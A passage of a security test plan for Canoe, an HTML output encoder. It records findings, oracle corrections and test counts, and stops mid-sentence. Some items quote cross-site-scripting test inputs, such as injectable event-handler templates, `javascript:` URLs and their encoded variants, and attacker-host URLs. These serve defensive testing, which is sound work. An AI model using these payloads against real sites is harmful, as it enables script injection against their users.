# Canoe Adversarial Test Suite — Plan

**Subject:** Test strategy for Canoe, the context-aware HTML output encoder
**Date:** 2026-07-26
**Status:** In progress — see the progress ledger below.
**Companion document:** `CANOE-SECURITY-REVIEW-2026-07-25.md` (findings F1–F21, referenced throughout)

---

## 0. Progress

| Task | Status | Notes |
|---|---|---|
| T1 Test dependencies, JUnit platform | done | 24 existing tests run unchanged via the vintage engine |
| T2 Playwright, gated `browserTest` | done | Own source set, so `test` never sees the driver bundle |
| T3 `CanoeTestSupport` | done | Reproduces F1; render options for auto-escaping and `$_x` |
| T4 Corpus data model | done | Per-payload verdicts, family verdicts, uncited-vulnerability guard |
| T5 `Payloads` | done | 44 payloads, 17 families, explicit slugs |
| T6 `CanoeStateMachineTest` | done | 102 tests; merged state+context table, reflection-driven coverage, the exhaustive `on*` table that found F19 |
| T7 `CanoeWriterContractTest` | done | 16 tests; F9 characterised, incl. error suppression at offset 2 |
| T8 `HtmlEncoderTest` | done | 29 tests; exhaustive code-point sweeps, no-delimiter property, F16 found |
| T9 `HtmlEncoderUrlTest` | done | 26 tests; F6 pinned both ways, F15 found (five sub-cases) |
| T10 `AttributePrefixTest` | done | 93 tests; colon boundary pinned at index 10, F5 as a length table, F17 found |
| T11 `CanoeRobustnessTest` | done | 51 tests; all 13 `raiseError()` messages across 15 call sites, F13 pinned through the real `render()`, F18 found |
| T12 `CanoeCorpus` build-out | done | 153 cases / 774 invocations, up from 16 / 80; §§A.1, A.2, A.4 and A.7 filled in; every payload family is now claimed, so `KNOWN_GAPS` and its guard test are gone; F20 found, then re-scoped and re-rated by the review of the build-out (§0.10) |
| T13 `BodyContextTest` | done | 143 tests; the "what is not affected" claim asserted end to end over every §A.1 body case and every payload; one clarification to the review's fourth character category (DEL is above the C0 range, so the review is right and its phrasing invites the wrong reading) |
| T14 `AttributeNameMatrixTest` | done | 231 tests; the ~90-name matrix with the `ATTR_*` partition asserted as a whole, a source-derived guard over the non-handler branches, and F21 found |
| T15 `EventHandlerMatrixTest` | done | 125 tests; corpus §A.3 filled in from 5 cases to 116, the completeness guard against a checked-in HTML Standard list, and F2's count corrected from "roughly 40" to 76 of 94 (via a wrong 74 of 92; see §0.12) |
| T16 `UrlSinkTest` | done | 368 tests; the five recognised names across nine elements, tag-name blindness asserted as a byte equality, F6's exploitation vector as a running test, and the four substitution positions as the rule that bounds F6 |
| T17 `CssContextTest` | done | 72 tests; F4's precondition as a function of the colon's index rather than of the property name, the quoted-CSS-string non-mitigation, and the stylesheet/attribute asymmetry |
| T18 `ScriptAndStyleElementTest` | done | 80 tests; total suppression in both element bodies, F10's two desyncs asserted as Canoe-versus-jsoup disagreements, the CSS twins measured rather than inferred, and the no-raw-`<` precondition quantified pending T23 |
| T19 `VelocityIntegrationTest` | done | 40 tests; F12 both ways, the two formal-notation bypass traps, and the one §A.6 claim that does not reproduce (strict mode) |
| T20 `ViewFactoryRenderTest` | done | 49 tests; 14 file-backed fixtures, byte-identical on both paths for every payload, all three production switches, F22 found |
| T21 `ChunkInvarianceTest` | done | 554 tests; invariance holds over all 9,996 two-way splits, and F9's blast radius measured at 243 of 275 |
| T22 `BufferResidueTest` | done | 39 tests; F5 as a length table with the deciding byte, the repair, the shorter indices, and residue across `write()` calls |
| T23 `ParserSteeringTest` | done | 656 tests; the review's corollary as a property, holding over 275 templates x 52 payloads, with the encoder-relaxation gate written into the javadoc |
| T24 `DomEquivalenceTest` | done | 280 tests; no structural divergence anywhere, and the blind spot demonstrated on four cited findings rather than described |
| T25 `SentinelServer` | done | loopback, ephemeral port, `text/html; charset=UTF-8` taken from `View`'s own constant, 404 everywhere else so `onerror` payloads can fire, and a request log the tests assert against; `/user-content` doubles as the sandbox oracle |
| T26 `BrowserTestBase` | done | Playwright and the browsers shared JVM-wide, a fresh `BrowserContext` per case, the five detectors of §5.2, trace and screenshot on failure; console output recorded but deliberately excluded from "exploited" |
| T27 `DetectorSelfTest` | done | **green in Chromium**; seven tests — all five detectors, an off-origin navigation calibrated against a second sentinel server, and the converse (nothing fires on a benign page) |
| T28 `BrowserCorpusTest` | done | 128 invocations x 1 engine, every ledger verdict held; 21 more invocations flagged not-browser-observable (24 → 45) and one detector defect found by the corpus |
| T29 `SinkSpecificBrowserTest` | done | 8 tests; `srcdoc` proven same-origin by reading the framing page from inside the iframe, `xlink:href`, meta refresh, `<base href>` retargeting the page's *own* `/logo.png`, CSS exfiltration, F23, F17 with a payload shaped for its position, and the sandbox pair |
| T30 Coverage gate | done | JaCoCo 0.8.15; `Canoe` 660/697 branches (94.69%), `HtmlEncoder` 171/172 (99.42%), `setTagAttributeContext()` 366/392, `reallyProcessChar()` 173/178 — **100% of reachable, measurable branches**, with all 37 exclusions enumerated in `build.gradle`; `NearMissNameSweepTest` closed the gap from 65.6% |
| T31 Fuzz harness | done | seeded, 2,000 iterations x 5 payloads in the hermetic run; **found F24 on its first run**; one million pairs clean afterwards |
| T32 Concurrency | done | 2,200 renders across 32 threads byte-identical to their single-threaded twins, plus a structural assertion over every static field of both classes |
| T33 `MatrixReportTest` | done | `matrix.md` + `matrix.csv` on every `test` run; 996 invocations, 281 `KNOWN_VULNERABLE`; the finding list is parsed out of the review so a zero-case finding is a measurement rather than a claim |
| T34 Documentation | done | `README.md`, `qlue_user_guide.md`, and a suite README; see §9 |

**Review-driven changes to this plan.** Reviews of T1–T5 and of T7–T9 each found defects in the
suite's own oracles — three wrong verdicts among fourteen seeded cases the first time, nine wrong
URL judgements the second — which is the strongest argument in this document for reviewing the tests
as carefully as the code they test. The changes that followed:

1. **The ledger is now asserted, not just recorded.** `VerdictEvaluator` derives the observed verdict
   independently and `CanoeCorpusTest.ledgerMatchesObservedBehaviour` fails when the ledger disagrees.
   This was originally implied by T12/T13; it has been pulled forward, because a corpus of unasserted
   opinions is exactly the failure mode §8 warns about. It has a self-test proving it can fail.
2. **Two new findings.** **F13**: `VelocityViewFactory`'s `[Encoding Error]` recovery branch is
   unreachable — it tests `startsWith(Canoe.ERROR_PREFIX)` on the top-level exception, but Velocity
   always wraps the `IOException`. Every encoding error is an unhandled 500, not a degraded page.
   **T11 was planned on the opposite premise and must be written against F13 instead.** **F14**: a
   comment ending in three or more dashes closes in every browser but leaves Canoe stuck in
   `COMMENT`, suppressing every reference for the rest of the page.

3. **State and context are asserted together.** T6 was written with separate context and state
   tables; they have been merged. A context-only assertion cannot distinguish deliberate suppression
   from a hole in the `currentContext()` switch, and would report a fix to F11 as a regression.

4. **The URL oracle now follows the WHATWG URL Standard.** A review of T7–T9 found nine cases where
   `VerdictEvaluator.analyseUrl` disagreed with a real browser, and **every one pointed the same
   way** — it said "safe" where the URL reaches an attacker's host. That is the one error a verdict
   ledger cannot recover from, because a false `SAFE` entry is never looked at again. Three rules
   were missing: backslash is a path separator for special schemes (`/\attacker.invalid/x` is
   off-origin, not a path), tab/LF/CR are removed from *anywhere* in a URL before parsing (which is
   what makes `java<LF>script:` live), and bracketed IPv6 literals must be recognised before the
   forbidden-host-character test. The fourth and worst was structural: the unrecognised-scheme
   fallback returned "not dangerous", making an eight-name denylist masquerade as an allowlist, so
   `ftp:` and `file:` were both judged safe. It is now an explicit allowlist — `http`, `https`,
   `mailto`, `tel` — and a new scheme fails loud. No ledger verdict changed as a result; the
   accidental neutralisations the corpus relies on (`%40`, `%5C`, `%3A`, the case-sensitive scheme
   regex) were re-confirmed against Node's parser and all still hold.

5. **One new finding, F16.** `HtmlEncoder.js()` truncates every astral code point to its low sixteen
   bits (U+10027 silently becomes an apostrophe), and `css()` emits two-digit hex escapes with no
   terminator, so `css("'a")` produces `'\27a'` — which CSS reads as U+027A. Neither is an injection
   while `CTX_JS` and `CTX_CSS` are suppressed, which is exactly why the existing delimiter sweep
   passed over both; both become live the moment the commented-out code at `Canoe.java:1074-1081` is
   uncommented. T8 now sweeps both encoders' allowlists rather than only checking their output for
   delimiters.

6. **The URL oracle now compares an origin, not a host — and has a test of its own.** A third
   review, differential against Node's WHATWG `URL` parser over 30,102 strings, found 77 more wrongly
   safe answers, all of one shape: `judgeAuthority` stripped the port and threw it away, and
   `BASE_SCHEME` was used only to pick a separator rule and never entered the comparison. So
   `//app.example:8443/x`, `https://app.example:8443/x` and `http://app.example/x` — a different
   origin, a different origin, and a TLS downgrade — were all "the page's own origin". None was
   reachable from the corpus, because no payload carries a port or an `http://app.example` host, so
   this was a latent hole rather than a wrong ledger entry; it is now a full scheme/host/port
   comparison with the scheme passed in as a parameter. The same review widened
   `FORBIDDEN_HOST_CHARS` to the standard's *forbidden domain* set (the forbidden host set plus every
   C0 control plus U+007F), which stops `//at%01tacker.invalid/x` and `//at%7Ftacker.invalid/x` from
   over-flagging. Two known conservative gaps are now recorded in the javadoc rather than left
   implied: no IDNA mapping, and the bracketed-host branch matches brackets without parsing an IPv6
   address. Both over-flag, which is the direction that gets noticed.

   The oracle also had no regression test of its own — the corpus exercises about five of
   `analyseUrl`'s branches, and the rules its javadoc leads with were covered only by incidental
   calls elsewhere. `UrlOracleTest` now pins 83 strings whose expectations are derived from Node
   rather than from the oracle, plus the four places the oracle deliberately disagrees with Node,
   each with its reason.

7. **Two more findings, one of which reorders the remediation list.** T10 and T11 each turned one up.
   **F17**: the `detectAttributePrefix()` reset that F4 describes applies to `ATTR_JS` as well as to
   `ATTR_CSS` and `ATTR_URI`, so `<a onclick="f({a:1,b:'$id'})">` — a handler Canoe recognises
   *correctly* — is html-encoded and therefore injectable. Replacing the `on*` table with a prefix
   rule cannot close it; only deleting the reset can. That makes the reset deletion load-bearing for
   a script-execution outcome rather than only for F4's CSS impact, and the review's remediation list
   has since been reordered to put it first (it was written third while claiming it belonged above
   item 1, which is a trap for anyone working top-down).
   **F18**: `tagCount` counts comments, so a licence header above `<!DOCTYPE html>` is rejected with
   "DOCTYPE declaration must be at the beginning" — a sixth entry for §3's availability table.

   T10 also settled the boundary the review corrected itself on: a colon at value index **0 through
   10** reaches `detectAttributePrefix()`, and index 11 does not, because `c == ':'` is tested before
   the `bufLen == 10` cutoff. `background:` is affected, `text-decoration:` is not. The parameterised
   row for each index means it cannot drift back.

8. **A review of T10 and T11 found F19, and two tests that could not fail.** The finding first:
   **F19** is a *third* dead `on*` branch, of exactly F1's class. `onreadystatechange`'s comparison
   chain sits inside `buf[2]=='r' && buf[3]=='e'` and then tests `buf[4]=='d'`, so the comparands
   spell `on`+`re`+`dystatechange` — the `a` of "ready" is missing. It matches an attribute named
   `onredystatechange` and cannot match the real one, so `<img src="x" onreadystatechange="f('$id')">`
   is injectable exactly as F1's `onsubmit` is. Of the 24 `on*` branches the source declares, 21 can
   be taken. `CanoeStateMachineTest` now asserts all 24 by name, one row each, which is the shape of
   test whose absence let three dead branches survive a hand review that found two of them.

   The two tests that could not fail are the more important half, because both were *green* and both
   were wrong in the way §8 warns about:

   - `CanoeRobustnessTest.noErrorCanoeRaisesWouldBeSwallowedInProduction` pinned F13 by
     re-implementing `message.startsWith(Canoe.ERROR_PREFIX)` over an exception the *harness* had
     produced. Nothing in the test tree called `VelocityViewFactory.render()` at all. Fixing F13
     would have left that predicate answering identically and the test green — a `KNOWN_VULNERABLE`
     pin that survives the fix, which §2.1 says must never happen. It now drives every input in the
     rejection table through the real `render()`, via a new `ProductionRenderProbe`, and asserts what
     a caller observes: an exception escapes and no `[Encoding Error]` reaches the response. As a
     side effect the suite finally exercises `Template.merge()`, whose wrapper message differs from
     `evaluate()`'s and is the one production actually produces.
   - `everyRaiseErrorCallSiteIsReached` compared a *set* of messages, and there are 15 `raiseError`
     call sites using 13 distinct messages. A new call site reusing an existing message would have
     left the set unchanged. It is now `everyRaiseErrorMessageIsReached`, and a companion test pins
     the call-site count so that an addition and a deletion both fail.

   Also corrected in the review document: F17's precondition was overstated (the `style:` example
   does not reproduce; the shape that does is a URL literal in the handler, `go('http://x')`), its
   High rating now states the precondition discount explicitly rather than leaving it to be
   re-litigated against F1's Critical, and the remediation list was reordered so that the item
   described as belonging first actually is first.

9. **Building out the corpus (T12) found F20, and one wrong verdict.** **F20** is a fifth *category*
   of sink, not a fifth mechanism: `sandbox`, `rel`, `target`, `integrity`, `type` and `formtarget`
   are consumed by the HTML parser itself as a **directive**, so the review's "JavaScript, CSS, a URL,
   or markup" framing does not reach them and F3's table does not list them. The reason it earns a
   finding rather than a row in F3 is that encoding is not merely insufficient here, it is
   *inapplicable*: a policy token is letters, digits, hyphens and spaces, every one of which either
   passes `html()` naked or round-trips through the parser's character-reference decoding. Only
   remediation item 3 — fail closed on unknown names — can close it, and that item's allowlist has to
   be written as an allowlist of plain-text names or `sandbox` lands on the wrong side of it. A new
   `SinkKind.POLICY` exists so the category is named in the corpus rather than folded into
   `PLAIN_TEXT_ATTR`, where the structural oracle would have called all six safe.

   *Superseded in part by item 10.* The six-name list above is the one first recorded, and three of
   the six do not survive the finding's own definition: `type`, `target` and `formtarget` are
   behavioural rather than security controls, and only a widened definition held them. The category
   is `sandbox`, `nonce`, `rel` and `integrity`, and the finding is Medium rather than High. The
   paragraph is left as written because the reasoning that follows it is unchanged and because the
   over-scoping is itself the lesson: a category invented while working through a matrix is easy to
   widen by one attribute at a time until it stops meaning anything.

   The wrong verdict is the more instructive half, and it is the same shape as the three from the
   first review: `separator.duplicate-attribute` (`<a href="/safe" href="$data">`) was written as a
   copy of `url.href-full` — same attribute, same classification, therefore same verdict — and it is
   **safe**, because the HTML parser keeps the *first* occurrence of a duplicate attribute and
   discards every later one, so the attacker's value never reaches a URL parser at all. Canoe's output
   is byte-identical to the vulnerable case; the parser is what saves it. `ledgerMatchesObservedBehaviour`
   caught it, which is the whole argument for asserting the ledger rather than recording it.

   Two mechanical changes came with the build-out. `KNOWN_GAPS` and `knownGapsShrinkToNothing` are
   deleted, as that test's javadoc instructed, because all six remaining payload families are now
   claimed by cases; `payloadFamilyCoverageOnlyEverImproves` becomes
   `everyPayloadFamilyIsReachedByACase` and asserts full coverage. And
   `payloadsCannotAddMarkupDelimitersToOutput` now handles the §A.7 rejection cases, which have no
   output to count delimiters in, by asserting the property that still means something there: whether
   Canoe rejects a template must depend on the template and never on the payload. Reported positions
   move with payload length and are stripped before comparing; which error was raised must not change.

10. **A review of the corpus build-out found no wrong `SAFE` verdict, and eight other things.** The
    ledger held over a 240-invocation hand sample, which is the first review of this suite that did
    not turn one up. Everything below is strengthening rather than correction, and it is listed
    because three of the items are about the *oracles* rather than the data, which is where the
    previous four reviews found their real defects too.

    - **The structural oracle was blind to `<head>`.** `domSkeleton` selected over `document.body()`,
      so any element the HTML parser hoists into `<head>` — `<title>`, `<script>`, `<noscript>` —
      left both the benign and the attacked render as the single skeleton `body[]`, and fifteen
      invocations compared equal no matter what the payload did. All five affected verdicts were
      right on the merits and none was actually being asserted; the CSP nonce case was the one where
      a breakout would have been invisible. It selects over the whole document now. Measured across
      the corpus both ways, **no invocation changes verdict**, so the fix cost nothing.
      `theLedgerOracleDetectsAWrongVerdict` gained a `<head>`-hoisted row, since its existing two
      rows only ever proved the oracle in body context.
    - **F17 had no corpus case at all** — the High finding the remediation list was reordered around,
      in a section (§A.4) T12 claims to have filled in. It has three now, and the trio rather than a
      single case is the point: `f({a:1,b:'$data'})` (colon at 4) and `go('http://x'+'$data')`
      (colon at 8) are injectable, `$.ajax({url:'/a',…})` (colon at 11) is suppressed, and nothing
      about what those handlers do distinguishes them.
    - **F20 was over-scoped and over-rated.** Its central claim is verified and its "encoding is
      inapplicable, not merely insufficient" argument is genuinely distinct from F3 — but the finding
      defined the category as "a switch that turns a security control on or off" while
      `SinkKind.POLICY` had quietly widened it to "security **or behavioural** directive", and the
      loose definition was the only thing holding `type`, `target` and `formtarget`. The strict
      definition wins, those three are plain-text cases now with their rejection reasoning recorded,
      and the finding is re-rated **Medium**: its only Critical-class row is `sandbox`, which the
      finding itself discounts twice, where F5 and F17 are held at High on one discount each.
    - **F20's boundary contradicted two neighbouring cases and its own remediation.** `clobber.id`
      makes F20's argument verbatim and records SAFE; `plain.nonce` was a parser-consumed security
      directive sitting in the plain-text group while `target` was ledgered vulnerable; and
      remediation item 3 listed `nonce` in its plain-text **allowlist**, so implementing the review as
      written would have left `nonce` on `html()` — the outcome F20 exists to prevent. `nonce` is a
      `POLICY` sink now, the allowlist entry is gone, and `SinkKind.POLICY` carries a three-part
      exclusion criterion so the three verdicts can be checked against each other.
    - **The policy cross-product recorded vulnerabilities for inert values.** Giving all three policy
      tokens to all six attributes made eight of eighteen rows claim that `sandbox="_blank"` — an
      unknown token, which leaves the sandbox maximally restrictive — is an escape. The oracle could
      not tell, because it asked only whether the bytes survived. It now carries each attribute's
      token vocabulary, and knows that an `integrity` value with no parseable hash expression makes
      the check pass vacuously rather than blocking the resource.
    - **A third axis: `browserObservable`.** About twenty browser-relevant invocations target vectors
      no 2026 browser will fire — `srcset` never runs a `javascript:` URL, `expression()` died with
      IE, a `data:` URL in a background-image attribute loads no document. §5.2's "divergence in
      either direction fails the test" would make every one of them a false failure the moment T25–T29
      land, and the corpus had started coping by redefining the verdict in a note ("the ledger records
      what Canoe emitted"), which is a second definition of `KNOWN_VULNERABLE` living alongside
      §2.1's. The verdict axis and the browser-expectation axis are now separate; see §5.2 and §A.9.
    - **§A.4 had real coverage loss.** No payload existed for the entity-encoded prefix, the
      percent-encoded prefix, the NUL split, the script-bearing schemes `VerdictEvaluator` names, or
      the all-backslash protocol-relative form — even though the URL oracle was hardened specifically
      because `ftp:`/`file:` had leaked in as safe. Four `JS_URL` payloads and one
      `PROTOCOL_RELATIVE` payload close the gap, and every URL case picks them up by family. Each is
      safe for its own separate reason, and the entity one is the corpus's clearest disproof of a
      second decode: `html()` escapes the ampersand, so the URL parser is handed the literal text
      `&#106;avascript`.
    - **Three assertions that could not fail, and one duplicate.** The delimiter property returned
      early on the 44 rejection cases and never examined their partial output (it passes over all 44 —
      the `return` was free to delete), and it stripped the reported error position rather than
      asserting it, where the data supports the exact identity *position drift equals output-length
      drift*. `shape.unclosed-attribute-value-at-end-of-output` was `SinkKind.NONE` + `SAFE`, and
      `observe()` returns `SAFE` unconditionally for `NONE`. `residue.data-url-clean-buffer` declared
      `noSink()` for a template with an obvious URL sink. And `prefix.javascript-exact` and
      `residue.js-url-clean-buffer` were the same case twice; the residue one now carries a short
      preceding attribute name, which makes the F5 trio a real progression (2 characters, 11, 11
      repaired by 10).
    - **`ENTITY_BREAKOUT` was never exercised where it means something.** It existed for the F1/F2
      mechanism and was used only in two plain-text sinks. It is paired with `QUOTE_BREAKOUT` in
      `handler.onsubmit` and `handler.onfocus` now, where the two together are the corpus's only
      direct evidence that the parser decodes exactly **once**: the raw apostrophe escapes the string
      literal and the pre-encoded one arrives as inert text. Recording that required the JavaScript
      oracle to stop equating verbatim arrival with liveness — §5.1 always said to test for the
      attacker's syntactically significant characters, and the evaluator had never implemented it.
    - Two smaller ones: the meta-refresh oracle was the corpus's only host-substring judgement, so
      `0;url=javascript:alert(1)` came back safe; it parses the content value and hands the target to
      the URL oracle now. And the reverse-order duplicate attribute (`<a href="$data" href="/safe">`)
      — the dangerous ordering, which `separator.duplicate-attribute`'s note described only in prose —
      is a case.

11. **T13–T15 found one new finding, corrected one count, and settled one boundary.** The three
    Velocity-tier matrices landed together because they share a shape: each consumes the corpus for
    its per-case ledger and adds the one thing a ledger cannot state about itself — a property, a
    partition, or a completeness guard.

    - **F21**, found by T14. `currentContext()` can never return `CTX_CSS`: the `TAG_ATTR_VALUE`
      switch groups `ATTR_CSS` with `ATTR_DATA`, `ATTR_CONTENT` and `ATTR_ACTIONSCRIPT` and returns
      `CTX_SUPPRESS` for all four, so `style` is suppressed by a `case` arm shared with three
      unrelated contexts — not by the `default:` branch, which nothing in this path reaches — and the
      `CTX_CSS` arm of `encode()` is dead code. No security impact today — both encode to the empty
      string —
      and it is a trap laid across the remediation path in the same way F16 is: uncommenting the two
      lines at `Canoe.java:1074-1081` is one symmetrical-looking edit of which the `CTX_JS` half
      takes effect and the `CTX_CSS` half changes nothing, with no diagnostic either way. It was
      found because T14 asserts the `ATTR_*` classification *together with* the `CTX_*` it produces,
      which is the pairing that makes the gap visible; a partition test over `ATTR_*` alone would
      have passed.
    - **F2's count was wrong by more than a factor of two.** "Roughly 40" and a 64-name list were
      both hand counts of the handlers somebody thought of — the same method that produced the
      defect. Measured against the HTML Standard's own tables, Canoe recognises **18 of 94** event
      handler content attributes; the three extra names it does recognise (`ondragdrop`, `onend`,
      `onmove`) are not in those tables, which is how 18 makes 21. (This bullet first read "18 of
      92", from a transcription that was itself wrong in two directions; see §0.12.) §A.3 went from 5
      cases to 116, generated from two name lists rather than hand-written, and the completeness
      guard reads
      `src/test/resources/canoe/html-event-handler-attributes.txt` and fails if a spec name has no
      case. That is the difference between "we listed the ones we thought of" — which is what
      `setTagAttributeContext()` is — and "we cover the spec", and repeating the component's own
      mistake inside the test meant to catch it would have looked like coverage.
    - **The `ATTR_*` partition agrees with the review exactly**: five `ATTR_URI` names, one
      `ATTR_CSS`, one `ATTR_CONTENT`, 21 reachable `ATTR_JS`, everything else `ATTR_HTML`. It is
      asserted from three independent directions now — `CanoeStateMachineTest` reads the 24 declared
      branches out of the source, `EventHandlerMatrixTest` probes every handler name that exists in
      the world, and `AttributeNameMatrixTest` reads the non-handler branches out of the source and
      partitions the ~90-name matrix. The last of those pins **F7** in a form that cannot be argued
      with: the branch commented `// content` compares the characters of `data`, and the branch
      commented `// data` is byte-identical to it and unreachable.
    - **One clarification to the review's prose**, from T13: the "what is not affected" section's
      fourth surviving category is "the literal four-character text `\xNN` for the remaining C0
      control characters", and DEL (U+007F) takes the ordinary reference branch instead, rendering as
      `&#127;`. This was first written up as a *correction*, which overstated it: U+007F is above the
      C0 range by definition, so the review's sentence is right as written and only invites the wrong
      reading, because "control character" in casual use includes DEL. The literal-output assertion
      is worth having either way — it is the only thing that would notice if the branch boundary
      moved.
    - **The `browserObservable` axis has an edge the guard forbids, and that is the right answer.**
      T15's brief asked for handlers no current browser fires to be flagged, naming `ondragdrop`. It
      cannot be: `ondragdrop` is *recognised*, so its row is `SUPPRESSED_BY_DESIGN`, and
      `browserObservabilityIsOnlyClaimedWhereItChangesAnExpectation` allows the flag only on a
      `KNOWN_VULNERABLE` browser-relevant pairing — because anywhere else the browser tier already
      expects silence and the flag records nothing while hiding the reasoning. The dead-event
      observation lives in the case's note instead. `handler.onshow` is the one handler in the group
      that both is injectable and fires nowhere (the `show` event was removed from the standard in
      2022 and Gecko's `<menuitem>` went with Firefox 85), so it carries the flag and the whole
      argument is written out on it. *Amended by §0.12:* it is the one **browser-relevant** handler
      that carries the flag for a dead event; `onreadystatechange` and `onvisibilitychange` carry it
      for the different reason that no element hosts them at all.

12. **A review of T13–T15 found no wrong verdict and six defects in the evidence, four of which were
    claims the suite was making about the world rather than about Canoe.** That is the pattern worth
    naming: the ledger held, the oracles held, and what did not hold was the *reference data* — the
    checked-in copy of the HTML Standard, the elements the cases were written on, and two javadoc
    sentences describing behaviour nobody had run. A corpus can be internally consistent and still be
    describing a browser that does not exist.

    - **The checked-in spec list was wrong, and it defines the suite's coverage claim.** It cited
      §8.1.7.2, which is "Queuing tasks"; the event handler tables are §8.1.8.2, and there are four of
      them, not three. The transcription merged the first two and dropped four names from the merged
      result — `onwebkitanimationend`, `onwebkitanimationiteration`, `onwebkitanimationstart` and
      `onwebkittransitionend`, excluded under a header note reading "CSS Animations" by a transcriber
      who had not noticed that HTML defines the *prefixed* forms itself — and it counted table 4's two
      `Document`-only IDL attributes as content attributes. Four too few and two too many is 92 where
      the answer is **94**, so the true figures are **18 recognised, 76 missed**, and the corpus
      matrix is **115** names. All four missing names are `ATTR_HTML`, all four are injectable, and
      all four fire from a CSS animation or transition **with no user interaction at all**, which
      makes them among the cheapest handlers in the group to trigger — the opposite of the "obscure
      legacy alias" they were dropped as. The header's claim that `onend` is a pre-standard Netscape
      name was wrong too: `onend` is a standardised SVG animation event attribute (SVG 1.1 §19) that
      Gecko fires. Its siblings `onbegin` and `onrepeat` are a real coverage gap in §A.3, now recorded
      in the file's header rather than absent from both the corpus and the exclusions.
    - **Three ledger rows claimed a browser sink that does not exist**, which the browser tier would
      have turned into permanent failures the day T28 lands. `handler.onreadystatechange` is a
      `Document` IDL attribute with no content-attribute form, so no engine registers it from markup;
      it is `notBrowserObservable` now, which the guard permits because the row is `KNOWN_VULNERABLE`
      and browser-relevant. `handler.onanimationstart` carried a note claiming "a CSS animation fires
      this with no user interaction" over a template with no `@keyframes` rule and no `animation`
      property, so nothing started; it has a real animation now, as does its `onwebkit*` twin. And
      `handler.onmouseenter`/`handler.onmouseover` targeted an **empty** `<div>`, which has zero
      height and cannot be hovered; both carry visible text now.
    - **Same root cause, wider: `SinkKind.JAVASCRIPT` was being claimed on elements that have no such
      sink.** The seventeen `Window`-reflecting handlers plus `onvisibilitychange` were generated on
      `<div>`, where no engine will ever fire them. The seventeen are generated on `<body>` now — the
      element the HTML Standard reflects them onto — which costs nothing, because Canoe discards the
      tag name before classifying and the verdicts are identical. The two `Document` IDL names have no
      element to move to, so the flag and a shared note are the honest record instead.
    - **Two test-side defects of the class §8 warns about.** `theGuardWouldNoticeAMissingName`'s
      javadoc said it "proves the guard above can fail" and it did nothing of the kind — it
      sanity-checked the resource file and never ran the guard's `missing.isEmpty()` logic against a
      name that ought to be missing. The logic is a named method now (`namesWithNoCase`), the guard
      calls it, and the self-test drives it with a name no corpus case can have, which is what
      `CanoeCorpusTest.theLedgerOracleDetectsAWrongVerdict` had been doing properly all along. And
      `CanoeCorpus`'s javadoc had cited `EventHandlerMatrixTest.theRecognisedListMatchesTheState`
      `MachineTable` since T15; that test did not exist. The claim was true and unasserted, which for
      a cross-reference between two hand-maintained name lists is the whole thing that could go wrong.
      It exists now and asserts **membership**, not a count: two lists of 21 can agree on their size
      and disagree on a name, and a name is what a security decision is made of.
    - **Duplicated coverage removed rather than left to rot.**
      `BodyContextTest.aBodyReferenceCanNeverContributeAMarkupDelimiter` re-ran, over 82 invocations,
      the delimiter-count assertion `CanoeCorpusTest.payloadsCannotAddMarkupDelimitersToOutput`
      already makes over all 996 — the airtight form of the property, over a strict superset. It keeps
      only the extracted-region half, which is the readable form and says *which* characters, and its
      javadoc names where the load-bearing half lives so the two are not re-merged.
      `AttributeNameMatrixTest.aPlainTextAttributeReceivesThePayloadWholeAndAsText` hid a whole
      name × payload cross-product inside one `@Test`, so the first failure stopped the sweep; it is a
      `@ParameterizedTest` like the rest of that file.
    - **Two prose corrections.** F21's *summary* in both documents said `style` is suppressed by the
      `default` arm. It is not: `ATTR_CSS` has an explicit `case` arm grouped with `ATTR_DATA`,
      `ATTR_CONTENT` and `ATTR_ACTIONSCRIPT`, and the `default:` is a separate branch nothing in this
      path reaches. F21's own body always said it correctly. The sharper statement — "a `case` arm
      shared with three unrelated contexts" — is what both summaries say now. The second is the DEL
      wording, downgraded from a correction to a clarification; see item 11.

13. **T16, T17 and T18: three properties, and one thing the review does not say.** The three files
    consume the corpus rather than re-declaring templates, and each states the property its task
    names — the thing a per-case ledger structurally cannot say.

    - **T16 pins tag-name blindness as an equality**, across `<a>`, `<img>`, `<script>`, `<iframe>`,
      `<embed>`, `<link>` and `<base>`. The claim F6 rests on is not "each of these is
      percent-encoded" but "Canoe cannot tell them apart", and only a comparison says the second
      thing. That test is what remediation item 5 has to break.
    - **T16 also bounds F6, which the review does not.** Measured across the four substitution
      positions, `url()` emits byte-identical output in all of them and the outcomes differ
      completely: full-URL and path-prefix let the payload reach the URL's **authority** and are the
      vector; path-suffix, query-parameter and fragment do not and are safe. So F6 is not "a
      URL-bearing attribute holding a reference is vulnerable", it is "a URL-bearing attribute whose
      reference can begin the authority is vulnerable" — and the grep the review's triage section
      recommends returns all five shapes. Two new corpus cases (`url.href-query-parameter`,
      `url.href-fragment`) record the safe half, because a rule with no negative rows is an assertion
      about the cases somebody chose.
    - **T17 makes F4's precondition a function of an integer**, not of a property name. Every property
      the finding lists is a row, and each row asserts the colon's index, the context that implies,
      and what the CSS parser is handed — together, because `padding:` and `display:` must agree
      (both 7) and `background:` and `font-family:` must differ (10 and 11). Three corpus cases were
      missing for that set (`margin`, `display`, `position`) and two shapes were missing entirely: a
      reference inside a quoted CSS string, which turns out to be no container at all
      (`content:'$x'` injectable, `font-family:'$x'` suppressed, four characters apart), and a
      reference inside an `@media` block, which is suppressed like the rest of a stylesheet body.
    - **T18 asserts F10 as a disagreement between two parsers**, which is what F10 is and what no
      single-parser ledger row can record: the same string goes through Canoe's state machine and
      through jsoup, and the test requires them to differ. The four F10 rows keep their existing
      verdicts — see the note below — and `onlyTemplateTextCanCauseADesync` quantifies the
      reachability argument over every payload in the catalogue and all seven templates, which is the
      local form of the property `ParserSteeringTest` (T23) will state over the whole corpus.
    - **One thing added to F10.** Its refutation reasons about `htmlWhite()`, which is what a *text*
      position after a forward desync gets. After `</scriptfoo>` Canoe believes it is in HTML, so a
      URL attribute puts **`url()`** output into what the browser reads as script data — and `url()`
      passes `=`, `/`, `.` and `#` naked, which `htmlWhite()` does not. `location=/x/` is twelve
      characters of live JavaScript, all allowlisted. It is still inert, and for a *different* reason
      from the one F10 gives: the template's own `<a href="` is a JavaScript syntax error, and a
      syntax error anywhere in a classic script block stops the whole block. Both halves are tests
      now. The second is the one that would go first, because it depends on the template rather than
      on the encoders.
    - **Not reproduced.** The brief for T18 asked that the two desyncs be ledgered `KNOWN_VULNERABLE`
      against F10 "with the review's note that they are not attacker-reachable today". Those two
      instructions contradict each other under §2.1, which defines `KNOWN_VULNERABLE` as attacker data
      reaching the sink *live*: the desync is created by template literal text and the payload arrives
      inert either way, so `ledgerMatchesObservedBehaviour` rejects the verdict immediately and
